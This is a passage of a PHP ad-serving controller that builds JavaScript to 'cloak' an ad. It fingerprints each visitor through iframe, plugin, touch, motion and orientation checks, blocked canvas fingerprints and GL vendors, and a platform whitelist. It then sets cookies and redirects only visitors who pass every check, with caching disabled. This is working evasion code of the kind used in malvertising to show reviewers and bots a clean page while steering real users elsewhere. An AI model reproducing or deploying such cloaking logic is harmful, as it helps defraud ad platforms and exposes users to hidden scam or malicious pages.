                ($ad_data->motionCloakingEnabled ? "timeoutValue = Math.max(timeoutValue, motionDetector.getTimeout());\n" : "") .
                ($ad_data->orientationCloakingEnabled ? "timeoutValue = Math.max(timeoutValue, orientationDetector.getTimeout());\n" : "") .
                (($ad_data->redirectTimeout>0) ? "timeoutValue +=  $ad_data->redirectTimeout;\n" : "") .
                ($ad_data->trackingPixelEnabled && !empty($ad_data->trackingPixelUrl) ? "addTrackingPixel();\n" : "") .
                ($ad_data->iframeCloakingEnabled ? "testResults.push(inIFrame());\n" : "") .
                ($ad_data->pluginCloakingEnabled ? "testResults.push(!hasPlugins());\n" : "") .
                ($ad_data->touchCloakingEnabled ? "testResults.push(isTouch());\n" : "") .
                ($ad_data->canvasFingerprintCheckEnabled && !empty($ad_data->blockedCanvasFingerprints) ? "testResults.push(!inBlockedCanvasList());\n" : "") .
                ($ad_data->glVendorCheckEnabled && !empty($ad_data->blockedGLVendors) ? "testResults.push(!inBlockedGLVendors());\n" : "") .
                "jslog(testResults);
						   	if (testResults.every(isTrue))
						   	{
							   	if (/(".join("|", $ad_data->platform_whitelist).")/i.test(window.navigator.platform))
							    {
								    setTimeout(function()
									{
										".($ad_data->motionCloakingEnabled? "if (!motionDetector.isMobileDetected()) return;\n" : "") .
                                        ($ad_data->orientationCloakingEnabled? "if (!orientationDetector.isMobileDetected()) return;\n" : "") ."
										jslog('CHECK:PLATFORM_ALLOWED: Platform test succeeded: ' + window.navigator.platform);
										var topDomain = getReferrerDomain();
                                        
                                        $cookiesCode
                                        
                                        $redirectCode

									}, timeoutValue);
								}
								else
								{
									jslog('CHECK:PLATFORM_BLOCKED: Platform test failed: ' + window.navigator.platform);
								}
							}
					   	}
 
					   </script>";

            if ($ad_data->outputMethod === "JS")
            {
                $scriptCode .= "\n<script type=\"text/javascript\">go();</script>";

                $resultHtml = str_replace("{script}", $scriptCode, $ad_data->resultHtml);
                $resultHtml = str_replace("{baseUrl}",base_url(""),$resultHtml);
                $resultHtml = str_replace("{assetsUrl}",base_url("assets"),$resultHtml);
                $resultHtml = str_replace("{queryString}", $queryString, $resultHtml);

                $resultHtml = createJSCode($resultHtml);
            }
            else
            {

                $onloadCode = " onload=\"go();\"";

                $resultHtml = str_replace("{script}", minify($scriptCode), $ad_data->resultHtml);
                $resultHtml = str_replace("{baseUrl}",base_url(""),$resultHtml);
                $resultHtml = str_replace("{assetsUrl}",base_url("assets"),$resultHtml);
                $resultHtml = str_replace("{onload}", $onloadCode, $resultHtml);
            }
        }

        $this->disable_client_cache();

        if ($ad_data->outputMethod == "JS")
        {
            $this->set_output_to_js();
        }

        // Print result
        echo $resultHtml;
	}

	private function disable_client_cache() {
        header("Expires: Mon, 01 Jan 1985 05:00:00 GMT");
        header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
        header("Cache-Control: no-store, no-cache, must-revalidate");
        header("Cache-Control: post-check=0, pre-check=0, max-age=0", false);
        header("Pragma: no-cache");
    }

    private function set_output_to_js() {
        header("Content-Type: application/javascript");
    }

	private function show_not_found() {
		header("HTTP/1.1 404 Not Found");
		$this->load->view("errors/html/error_404",Array("heading"=>"Ad not found","message"=>"The link to the ad may be broken"));
	}

    private function served_by_https()
     {
         if (array_key_exists('HTTPS',$_SERVER) && $_SERVER['HTTPS'] !== 'off') return true;
         if( !empty( $_SERVER['HTTP_X_FORWARDED_PROTO'] ) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')  return true;
         return false;
     }
}


